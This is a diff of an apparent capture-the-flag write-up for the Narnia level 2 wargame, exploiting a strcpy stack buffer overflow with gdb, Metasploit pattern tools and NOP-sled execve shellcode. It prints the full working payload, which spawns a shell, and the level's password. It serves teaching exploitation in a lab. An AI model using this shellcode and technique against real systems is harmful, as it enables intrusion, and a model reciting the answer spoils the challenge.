@@ -171,16 +171,83 @@ int main(int argc, char * argv[]){
 - It copies the C string pointed by source (**argv[1]**) into the array pointed by destination (**buf**), including the terminating null character
 - **strcpy** doesn’t perform any memory boundary check
 - Therefore, we are able to write more than 128 characters into **buf** and buffer overflow occurs
-    - For example: ```./narnia2 `python -c "print('A' * 128)"` ``` 
-    - Or jointly with gdb: ``` gdb --args narnia2 `python -c "print('A' * 128)"` ``` 
-- Then, we have to figure out how to overwrite the return address of the function call by replacing it with crafted shellcode
+    - ```./narnia2 `python -c "print('A' * 128)"` ``` 
+- We combine it with ltrace to see what is happening in the background:
+    - ``` ltrace ./narnia2 `python -c "print('A' * 128)"` ``` --> it works
+    - ``` ltrace ./narnia2 `python -c "print('A' * 130)"` ``` --> it still works
+    - ``` ltrace ./narnia2 `python -c "print('A' * 140)"` ``` --> SIGSEGV (Segmentation Fault !)
+    - Alternative if buffer size is not given: Generate a uniqe string with metasploit
+        - `usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700`  (sting length 700 bytes)
+        - `usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 700 -q [EIP Value]`  (get offset; extract [EIP value] from debugger during buffer overflow)
+![grafik](https://user-images.githubusercontent.com/84674087/143482336-a856185f-301b-4b6b-88a2-e517357bdba1.png)
+
+- Now we have to figure out how much buffer overflow we need to precisely overwrite the instruction pointer eip (in order to inject crafted shellcode)
 - Let's take a look with `gdb ./narnia2`, followed by `disass main`
 
 ![grafik](https://user-images.githubusercontent.com/84674087/143130183-a9725c3d-8ed4-412f-aadd-71f9ce1ad2be.png)
 
-- We see **strcpy** at address ..
-- Examine this part further: `disass strcpy`
+- We take following action to analyze the binary
+```
+# in python2
+b main
+b *0x0804849c
+r $(python -c "print 'A' * 140")
 
-![grafik](https://user-images.githubusercontent.com/84674087/143134970-3b1a4e6b-1acc-407c-8c95-0a3dc9048a15.png)
+# in python3
+b main
+b *0x0804849c
+r $(python3 -c "print('A' * 140)")
+
+# Alternative: Start gdb directly with arguments
+gdb --args narnia2 `python -c "print 'A' * 140"`
+b main
+b *0x0804849c
+```
+- We figure out that `'A' * 132 + 'C' * 4` will fill the EIP with four Cs
+- Now we can choose where to put our shellcode: Either in between the A-block or right after the EIP
+- If we put it after the EIP we have to get sure about the program flow, i.e. we need shellcode for JMP ESP (jump to stack pointer) inside EIP
+- In this case we keep it simple and place the shellcode inside the A-block
+- We choose [Shellcode 811](http://shell-storm.org/shellcode/files/shellcode-811.php) which accounts for 28 Bytes
+- Further, let's replace A with NOP (\x90)
+- Interim result: `$(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'CCCC'")`
+- We start with `gdb -q narnia2` and inside gdb `b *0x0804849c` (the address at leave)
+- Then we run: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'CCCC'")`
+- At breakpoint 1 we check the address of EIP: `i f`
+- And the content of ESP: `x/40wx $esp`
+
+![grafik](https://user-images.githubusercontent.com/84674087/143502578-ed1896f9-35bd-4dd7-a2bc-0e51735f0156.png)
+
+![grafik](https://user-images.githubusercontent.com/84674087/143502597-d42138da-bf9f-4cb3-b96e-f5a51e4bb8b4.png)
+
+- We can clearly see all the NOPs, the shellcode and CCCC at EIP address
+- Next step is the execution of our shellcode. To do so we need to place an address inside EIP which directs into the NOP field
+- EIP redirects into NOP, and NOP gets executed (without effect upon the running program) until it reaches our shellcode
+- From the picture above we can select any memory address: `0xffffd618` as example
+- Remember to write it in little-endian order: `\x18\xd6\xff\xff`
+- Interim result #2: `r $(python -c "print '\x90' * (136-4-28) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x18\xd6\xff\xff'")`
+
+![grafik](https://user-images.githubusercontent.com/84674087/143503139-bbd6b1ed-6215-498d-95d4-0f71f44c6abf.png)
+
+- We get another SIGSEGV
+- Surprisingly the EIP address seems to be `0xffffd635`
+- We restart the debugging and check the content of ESP at the breakpoint again:
+- The EIP seems to be located within our shellcode (red marking)
+
+![grafik](https://user-images.githubusercontent.com/84674087/143503465-7cb82e94-3279-4183-bf70-76f72ee441ee.png)
+
+- Thus, we pull our shellcode  10 bytes to the left and fill the gap after the shellcode with NOPs: (136-4-28) --> (136-4-38)
+- Interim result #3: `r $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x18\xd6\xff\xff'")
+- Let's try it again
+
+![grafik](https://user-images.githubusercontent.com/84674087/143503696-d9e71196-beca-4593-b4bf-81f0804dbfc3.png)
+
+- We get `/bin/dash` executed: Good sign !
+- Now we run narnia2 without gdb:
+- `./narnia2 $(python -c "print '\x90' * (136-4-38) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x90' * 10 + '\x18\xd6\xff\xff'")`
+- Success ! We get the shell and enter `cat /etc/narnia_pass/narnia3`
+- **PASSWORD:** vaequeezee
+
+
+![grafik](https://user-images.githubusercontent.com/84674087/143498192-f96ebd61-e18c-45ed-bc90-8fcae3e9faaa.png)
 
 <br />
